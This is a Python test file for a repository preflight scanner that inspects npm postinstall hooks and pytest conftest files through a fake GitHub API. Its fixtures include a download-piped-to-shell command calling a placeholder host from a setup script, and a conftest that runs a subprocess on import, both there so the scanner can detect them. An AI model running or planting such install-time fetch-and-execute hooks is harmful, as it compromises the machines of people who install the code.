"""Remote preflight reads a pinned commit as data through a fake API; nothing executes."""

from __future__ import annotations

import base64
import hashlib
import json

import pytest

from agentmetry.core.scanner import github_preflight


def _blob(text: str) -> dict:
    return {"content": base64.b64encode(text.encode()).decode(), "size": len(text.encode())}


class FakeAPI:
    def __init__(self, tree: dict[str, dict], commit_sha: str = "a" * 40, truncated: bool = False):
        self._tree = tree
        self._commit_sha = commit_sha
        self._truncated = truncated
        self.requests: list[str] = []

    def get_json(self, path: str) -> dict:
        self.requests.append(path)
        if path.startswith("/repos/") and "/commits/" in path:
            return {"sha": self._commit_sha}
        if "/git/trees/" in path:
            return {"truncated": self._truncated,
                    "tree": [{"path": p, "type": "blob", "sha": e["sha"], "size": e["size"]}
                             for p, e in self._tree.items()]}
        if "/git/blobs/" in path:
            sha = path.rsplit("/", 1)[-1]
            for entry in self._tree.values():
                if entry["sha"] == sha:
                    return _blob(entry["text"])
            raise github_preflight.FetchError("unknown blob")
        raise github_preflight.FetchError(f"unexpected {path}")

    def get_blob(self, repo: str, sha: str) -> bytes:
        for entry in self._tree.values():
            if entry["sha"] == sha:
                return entry["text"].encode()
        raise github_preflight.FetchError("unknown blob")


def _entry(text: str) -> dict:
    raw = text.encode()
    return {"sha": hashlib.sha256(raw).hexdigest(), "size": len(raw), "text": text}


def test_github_preflight_inspects_referenced_script_at_pinned_commit():
    body = "curl -s https://example.invalid/x.sh | sh\n"
    api = FakeAPI({
        "package.json": _entry(json.dumps({"scripts": {"postinstall": "bash ./scripts/setup.sh"}})),
        "scripts/setup.sh": _entry(body),
    })
    report = github_preflight.inspect_github("octo/demo@" + "a" * 40, api=api)
    assert report.target == f"github:octo/demo@{'a' * 40}"
    assert report.exit_code() == 0
    (surface,) = report.surfaces
    assert surface.trigger == "npm_install"
    assert surface.reference.status == "present_inspected"
    assert surface.reference.content_sha256 == hashlib.sha256(body.encode()).hexdigest()
    assert "download_pipe_to_shell" in surface.reference.observations
    for output in (json.dumps(report.to_json()), "\n".join(report.lines())):
        assert body not in output and "example.invalid" not in output


def test_github_preflight_resolves_default_branch_and_conftest():
    api = FakeAPI({
        "conftest.py": _entry("import subprocess\nsubprocess.run(['id'])\n"),
        "package.json": _entry(json.dumps({"scripts": {"postinstall": "node ./missing.js"}})),
    })
    report = github_preflight.inspect_github("octo/demo", api=api)
    assert report.target == f"github:octo/demo@{'a' * 40}"
    assert any(p.endswith("/commits/HEAD") for p in api.requests)
    by_trigger = {row.trigger: row for row in report.surfaces}
    assert "module_level_subprocess_call" in by_trigger["pytest_conftest"].reference.observations
    assert by_trigger["npm_install"].reference.status == "not_found"


def test_github_preflight_truncated_tree_is_partial():
    api = FakeAPI({"package.json": _entry(json.dumps({"scripts": {"postinstall": "echo ok"}}))},
                  truncated=True)
    report = github_preflight.inspect_github("octo/demo@" + "b" * 40, api=api)
    assert report.exit_code() == 2
    assert report.to_json()["coverage"] == "partial"
    assert any(x["reason"] == "tree_truncated" for x in report.unobserved)


def test_github_preflight_skips_dependency_dirs_and_bad_target():
    api = FakeAPI({
        "package.json": _entry(json.dumps({"scripts": {"postinstall": "echo ok"}})),
        "node_modules/dep/package.json": _entry(json.dumps({"scripts": {"postinstall": "echo dep"}})),
    })
    report = github_preflight.inspect_github("octo/demo@" + "c" * 40, api=api)
    assert report.manifests_read == 1
    with pytest.raises(ValueError):
        github_preflight.parse_target("not-a-repo")


def test_github_preflight_cli(monkeypatch, capsys, tmp_path):
    from agentmetry.cli import main

    api = FakeAPI({"package.json": _entry(json.dumps({"scripts": {"postinstall": "echo ok"}}))})
    monkeypatch.setattr(github_preflight, "GitHubAPI", lambda token=None: api)
    assert main(["scan", "--github", "octo/demo@" + "d" * 40, "--json"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["mode"] == "repository_preflight"
    assert out["target"].startswith("github:octo/demo@")
    assert main(["scan", "--github", "octo/demo", "npm:example"]) == 2
